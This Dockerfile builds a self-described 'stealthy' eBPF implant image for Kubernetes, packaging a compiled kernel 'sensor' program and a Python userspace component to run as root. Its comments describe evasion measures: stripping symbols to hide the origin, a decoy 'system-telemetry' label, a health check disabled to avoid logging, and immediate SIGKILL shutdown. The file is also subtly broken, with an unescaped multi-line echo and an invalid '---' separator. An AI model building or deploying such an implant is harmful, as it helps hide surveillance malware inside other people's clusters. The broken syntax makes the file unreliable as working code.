# eBPF Implant - Stealthy Kubernetes Container Image
# Multi-stage build to minimize layer footprint
# Final image: ~150MB (minimal attack surface)

FROM ubuntu:22.04 as builder

RUN apt-get update && apt-get install -y \
    build-essential \
    clang \
    llvm \
    libelf-dev \
    libz-dev \
    pkg-config \
    cmake \
    git \
    linux-headers-generic \
    python3 \
    python3-pip \
    python3-venv \
    wget \
    curl \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build

# Copy eBPF kernel program
COPY kernel/programs/sensor.bpf.c .

# Compile eBPF program to bytecode
RUN clang -O2 -target bpf -c sensor.bpf.c -o sensor.o

# Strip symbols to hide origin
RUN strip --strip-all sensor.o

# Copy Python source
COPY userspace/src/ /build/src/

# Create requirements file
RUN echo "bcc>=0.20.0
requests>=2.28.0
cryptography>=38.0.0" > requirements.txt

# Build Python wheels
RUN python3 -m venv /opt/venv && \
    /opt/venv/bin/pip install --upgrade pip && \
    /opt/venv/bin/pip install --no-cache-dir -r requirements.txt

---
# Runtime stage: Minimal image
FROM ubuntu:22.04

# Install minimal runtime dependencies only
RUN apt-get update && apt-get install -y \
    python3 \
    libelf1 \
    libz1 \
    curl \
    dnsutils \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/* \
    && rm -rf /tmp/* /var/tmp/* /var/cache/apt/*

# Set up working directory
WORKDIR /opt/implant

# Copy compiled eBPF program from builder
COPY --from=builder /build/sensor.o /opt/implant/

# Copy Python virtual environment
COPY --from=builder /opt/venv /opt/venv

# Copy Python source code
COPY --from=builder /build/src/ /opt/implant/src/

# Copy configuration
COPY config.json /opt/implant/config.json

# Copy entrypoint
COPY deployment/docker/entrypoint.sh /opt/implant/entrypoint.sh
RUN chmod +x /opt/implant/entrypoint.sh

# Set environment
ENV PATH="/opt/venv/bin:$PATH"
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1

# Minimize container metadata
LABEL description="system-telemetry"
LABEL version="2.0-k8s"

# Health check disabled (avoids logging)
HEALTHCHECK NONE

# Run as root (required for eBPF)
USER root

# No signal handling (forces immediate shutdown)
STOPSIGNAL SIGKILL

# Entry point
ENTRYPOINT ["/opt/implant/entrypoint.sh"]

